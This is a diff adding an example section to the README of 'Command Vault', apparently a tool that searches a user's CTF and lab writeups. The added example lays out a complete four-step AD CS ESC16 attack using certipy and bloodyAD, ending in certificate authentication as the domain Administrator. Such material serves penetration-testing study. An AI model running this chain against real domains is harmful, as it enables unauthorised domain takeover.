@@ -186,6 +186,38 @@ from pwn import *
 - **Challenges**: CTF challenges with type in filename, e.g., `Challenge (web).md`
 - **Sherlocks**: DFIR investigations (detected from `/sherlocks/` in path)
 
+## Example: Real-World Usage
+
+> **You:** *"What was that certipy command I used for ESC16?"*
+
+Command Vault searches your writeups and returns the full attack chain with context:
+
+**1. Find vulnerable templates:**
+```bash
+certipy find -u 'user' -hashes ':hash' -dc-ip $IP -stdout -vulnerable
+# Output: "ESC16 : Security Extension is disabled"
+```
+
+**2. Change target UPN to Administrator:**
+```bash
+bloodyAD --host dc.domain.local -d domain.local -u controlleduser \
+  -p ':hash' set object targetuser userPrincipalName -v Administrator
+```
+
+**3. Request certificate with Administrator SID:**
+```bash
+certipy req -u 'targetuser@domain.local' -hashes ':hash' \
+  -ca 'YOURCA' -template 'User' \
+  -upn 'administrator@domain.local' -sid 'S-1-5-21-...-500'
+```
+
+**4. Authenticate with the certificate:**
+```bash
+certipy auth -pfx administrator.pfx -domain domain.local
+```
+
+All commands come with source context (which box, which section) so you can revisit the full writeup if needed.
+
 ## Troubleshooting
 
 ### "vault: command not found"
